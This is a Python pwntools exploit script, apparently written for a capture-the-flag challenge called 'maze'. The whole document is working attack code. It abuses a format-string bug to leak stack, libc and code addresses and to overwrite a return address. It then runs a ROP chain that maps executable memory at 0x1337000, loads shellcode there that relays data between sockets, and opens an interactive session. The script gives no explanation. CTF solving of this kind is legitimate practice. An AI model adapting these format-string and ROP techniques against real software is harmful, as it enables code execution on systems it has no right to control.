from pwn import *

context.arch = 'amd64'


###Util
def fsb(payload,silent=False,fds=None):
    if type(payload)==type(''):
        payload = payload.encode()
    prefix = b''
    if fds is not None:
        if silent is False:
            for i in fds:
                prefix+=p8(5)+p8(i)
        else:
            for i in fds:
                prefix+=p8(2)+p8(i)
    r.sendline(prefix+b'SHOUT '+payload)
    r.recvuntil('ECHO\n')
    if silent==False:
        for i in range(3):
            res = r.recvline()[:-1]
        return res

def leak_stuff(path=None):
    stack_buf = int(fsb('%109$p',fds=path)[2:],16)-0x4f0
    libc_start_addr = int(fsb('%216$p',fds=path)[2:],16)
    libc_base = libc_start_addr-libc_start_offset
    node_ret_addr = int(fsb('%148$p',fds=path)[2:],16)
    if path==None:
        code_base = node_ret_addr-nodesrc_ret_offset
    elif (node_ret_addr-nodepath_ret_offset)&0xfff==0:
        code_base = node_ret_addr-nodepath_ret_offset
    else:
        code_base = node_ret_addr-nodedst_ret_offset
    fdleak = fsb('%151$p%152$p',fds=path).split(b'0x')[1:]
    fdleak[0] = int(fdleak[0],16)
    fdleak[1] = int(fdleak[1],16)
    fds = [fdleak[0]&0xffffffff,fdleak[0]>>32,fdleak[1]&0xffffffff,fdleak[1]>>32]
    return stack_buf, libc_base, code_base, fds

def construct_mmap_ROP(base,input_fd,output_fd=1):
    ROPchain = p64(base+L_pop_rdi)+p64(0x32)+\
               p64(base+L_pop_rsi)+p64(0x1000)+\
               p64(base+L_cmp_rdi_rsi)+p64(base+L_cmovb_r10_rdi)+\
               p64(base+L_pop_rax)+p64(0xffffffff)+p64(base+L_mov_r8d_eax)+\
               p64(base+L_pop_rdi)+p64(0x1337000)+\
               p64(base+L_pop_rdx_r12)+p64(7)+p64(0)+\
               p64(base+L_clear_r9)+\
               p64(base+L_pop_rax)+p64(9)+\
               p64(base+L_syscall)+\
               p64(base+L_pop_rdi)+p64(output_fd)+\
               p64(base+L_pop_rsi)+p64(0x1337000)+\
               p64(base+L_pop_rdx_r12)+p64(0x100)+p64(0)+\
               p64(base+L_pop_rax)+p64(1)+\
               p64(base+L_syscall)+\
               p64(base+L_pop_rdi)+p64(input_fd)+\
               p64(base+L_pop_rsi)+p64(0x1337000)+\
               p64(base+L_pop_rdx_r12)+p64(0x400)+p64(0)+\
               p64(base+L_pop_rax)+p64(0)+\
               p64(base+L_syscall)+\
               p64(0x1337000)
    return ROPchain

###Addr
libc_start_offset = 0x26fc0+243
nodesrc_ret_offset = 0x1689
nodepath_ret_offset = 0x153d
nodedst_ret_offset = 0x1591

###ROPgadget
L_pop_rdi = 0x26b72
L_pop_rsi = 0x27529
L_pop_rdx_r12 = 0x11c371
L_mov_r8d_eax = 0x122937
L_clear_r9 = 0xc9ccf
L_cmovb_r10_rdi = 0x5e5e0
L_syscall = 0x66229
L_pop_rax = 0x4a550
L_cmp_rdi_rsi = 0x97de6
L_call_rax = 0x270b1
C_add_rsp_0x1c8 = 0x1c81

###Exploit
#41     inputbuf
#148    code
#151    fds
r = process(['./M'],env={'LD_PRELOAD':'./libc.so.6'})
#r = remote('pwn-maze-01.play.midnightsunctf.se',10000)

USEDFD = [0,1,0xffffffff]
parentfd = 0
outfd = 1
nodepath = [1]
sockcand = []


stack_buf, libc_base, code_base, fds = leak_stuff()
print(hex(stack_buf))
print(hex(libc_base))
print(hex(code_base))

sockcand.append([])
for i in range(4):
    if fds[i] not in USEDFD:
        childfd = fds[i]
        USEDFD.append(fds[i])
        USEDFD.append(fds[i]+1)
        if i==0:
            sockcand[-1].append(nodepath[-1]-1)
        elif i==1:
            sockcand[-1].append(nodepath[-1]+1)
        elif i==2:
            sockcand[-1].append(nodepath[-1]-4)
        else:
            sockcand[-1].append(nodepath[-1]+4)

fsb((f'%{(code_base+C_add_rsp_0x1c8)&0xffff}c%45$hn'.encode().ljust(0x20-6,b'\x00')+p64(stack_buf-0x128)).ljust(0xa8-6,b'\x00')+construct_mmap_ROP(libc_base,0),silent=True)

print('done')

shellcode = asm(f'''
                movzx edi, BYTE PTR [0x1337181]
                CALL WRITE
                jmp MAIN

                FUNCTIONS:
                    READCMD:
                        mov rsi, 0x1337bfe
                        mov rdx, 0x202
                        mov rax, 0
                        syscall
                        ret
                    READDATA:
                        mov rsi, 0x1337c00
                        mov rdx, 0x200
                        mov rax, 0
                        syscall
                    WRITE:
                        mov rsi, 0x1337c00
                        mov rdx, 0x200
                        mov rax, 1
                        syscall
                        ret
                    REFLECTLINE:
                        mov rsi, 0x1337bff
                        mov r12, 0
                        CONTINUE:
                        add rsi, 1
                        mov rdx, 0x1
                        mov rax, 0
                        syscall
                        add r12, 1
                        cmp byte ptr [rsi], 0xa
                        jne CONTINUE
                        mov rdx, r12
                        mov rsi, 0x1337c00
                        movzx edi, BYTE PTR [0x1337181]
                        mov rax, 1
                        syscall
                        ret        
                MAIN:
                    MAINLOOP:
                        movzx edi, BYTE PTR [0x1337180]
                        call READCMD
                        movzx rdi, BYTE PTR [0x1337bff]
                        CALL WRITE
                        movzx r13, BYTE PTR [0x1337bfe]
                        REFLECTLOOP:
                            movzx rdi, BYTE PTR [0x1337bff]
                            CALL REFLECTLINE
                            dec r13
                            test r13, r13
                            jne REFLECTLOOP
                        jmp MAINLOOP
                ''').ljust(0x180,b'\x00')+p8(parentfd)+p8(outfd)
#input()
r.recvuntil(b'\x00'*0x100)
r.send(shellcode+p8(parentfd)+p8(outfd))
r.recvuntil(b'\x00'*0x200)
stack_buf, libc_base, code_base, fds = leak_stuff([childfd])
#res = fsb('%109$p',fds=[childfd])
print(hex(stack_buf))
print(hex(libc_base))
print(hex(code_base))
print(fds)
#r.sendline(p8(5)+p8(childfd)+b'SHOUT %109$p')
#print(fds)

#print(fsb(b'%43$s'.ljust(10,b'\x00')+p64(stack_buf)))
r.interactive()
